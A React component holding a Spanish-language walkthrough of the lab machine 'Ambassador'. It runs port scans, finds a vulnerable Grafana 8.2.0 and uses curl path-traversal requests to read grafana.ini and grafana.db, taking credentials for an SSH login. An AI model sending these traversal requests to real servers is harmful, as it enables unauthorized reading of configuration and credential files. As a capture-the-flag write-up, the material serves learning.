import { Highlighter } from '../../utils/SyntaxHighlighter'
import { Paragraph } from '../../Components/Paragraph'
import { ContentBlock } from '../../Layout/ContentBlock'
import { SubTitle } from '../../Components/SubTitle'
import { Anchor } from '../../Components/Anchor'
import Image from 'next/image'

export function Ambassador () {
  return (
    <ContentBlock>
      <SubTitle>Ambassador</SubTitle>
      <Paragraph>
        Empezamos con nuestro escaneo
      </Paragraph>
      <Highlighter
        text={`
$ rustscan -a 10.10.11.183 -g -- -A -sS -n
10.10.11.183 -> [22,80,3000,3306]
        `}
      />
      <Paragraph>
        reporta cuatro puertos abiertos, toca ver los servicios:
      </Paragraph>
      <Highlighter
        text={`
$ rustscan -a 10.10.11.183  -- -A -sCV -n
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc=
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs=
|   256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 21 Oct 2022 22:35:10 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 21 Oct 2022 22:34:37 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 21 Oct 2022 22:34:42 GMT
|_    Content-Length: 0
3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 72
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, FoundRows, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, LongPassword, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ConnectWithDatabase, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, ODBCClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
        `}
      />
      <Paragraph>
        probamos en el panel de login en el puerto <i>3000</i> SQLI, Path Traversal, XXE, etc.
      </Paragraph>
      <Paragraph>
        Probamos buscando con searchsploit a grafana.
      </Paragraph>
      <Highlighter
        text={`
$ searchsploit grafana
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                                                                                                       | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                   | multiple/webapps/50581.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Result
        `}
      />
      <Paragraph>
        vemos la versión que corre con whatweb y si es vulnerable.
      </Paragraph>
      <Highlighter
        text={`
$ whatweb http://10.10.11.183:3000
http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
      `}
      />
      <Paragraph>
        nos traemos el script y le echamos un ojo
      </Paragraph>
      <Highlighter
        text={`
$ cat /usr/share/exploitdb/exploits/multiple/webapps/50581.py > 50581.py
        `}
      />
      <Paragraph>
        en la linea 71 vemos algo interesante
      </Paragraph>
      <Highlighter
        text={`
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
        `}
      />
      <Paragraph>
        un Path Traversal, sin embargo necesitamos apuntar a un archivo de configuración, por ejemplo, ¿Tal vez grafana tenga uno?
      </Paragraph>
      <Paragraph>
        *****GOOGLE: "grafana default config file"*****
      </Paragraph>
      <Paragraph>
        Configuration file location

        The default settings for a Grafana instance are stored in the $WORKING_DIR/conf/defaults.ini file. Do not change this file.

        Linux

        If you installed Grafana using the deb or rpm packages, then your configuration file is located at /etc/grafana/grafana.ini and a separate custom.ini is not used. This path is specified in the Grafana init.d script using --config file parameter.
      </Paragraph>
      <Paragraph>
        En este caso haremos un <i>curl</i> desde la terminal con toda la información recolectada, la variable <i>choice(plugin_list) </i> cogemos por ejemplo la primera variable o la variable table.
      </Paragraph>
      <Highlighter
        text={`
$ curl --path-as-is http://10.10.11.183:3000/public/plugins/table/../../../../../../../../../../../../../etc/grafana/grafana.ini -o hijack
      `}
      />
      <Paragraph>
        con el comando <i>cat</i> inspeccionamos el archivo <i>hijack</i>. En la línea 220 encontramos:
      </Paragraph>
      <Highlighter
        text={`
220: admin_password = **************
        `}
      />
      <Paragraph>
        con estas credenciales iniciamos sesión, vemos una pestaña de configuración de la base de datos y un usuario <i>grafana</i> que esta también en el archivo hijack.
      </Paragraph>
      <Paragraph>
        En la línea 109: Encontramos un archivo de configuración de la base de datos <i>grafana</i>, sin embargo no conocemos la ruta absoluta así que lo googleamos.
      </Paragraph>
      <Paragraph>
        Yo lo encontre <Anchor src='https://stackoverflow.com/questions/65860003/physical-location-of-grafana-dashboards'>aquí</Anchor>:
      </Paragraph>
      <Paragraph>
        The default folder of the dashboard is /var/lib/grafana. If you navigate to the folder, you will find a file name grafana.db.

        Download this file to your local machine or any machine which you want. Please download sqlitebrowser from here.
      </Paragraph>
      <Paragraph>
        y así hacemos un segundo <i>curl</i> al puerto <i>3000</i> donde recibe peticiones la base de datos <i>grafana</i>.
      </Paragraph>
      <Highlighter
        text={`
curl --path-as-is http://10.10.11.183:3000/public/plugins/table/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db.db
        `}
      />
      <Paragraph>
        Abrimos con <i>sqlitebrowser</i>, y
        nos traemos la contraseña del usuario developer
        que en la página principal nos decían que había un usuario con ese nombre y que se puede conectar por ssh.
      </Paragraph>
      {/* IMAGES DEVELOPER */}
      <Highlighter
        text={`
$ ssh developer@10.10.11.183
        `}
      />
    </ContentBlock>
  )
}
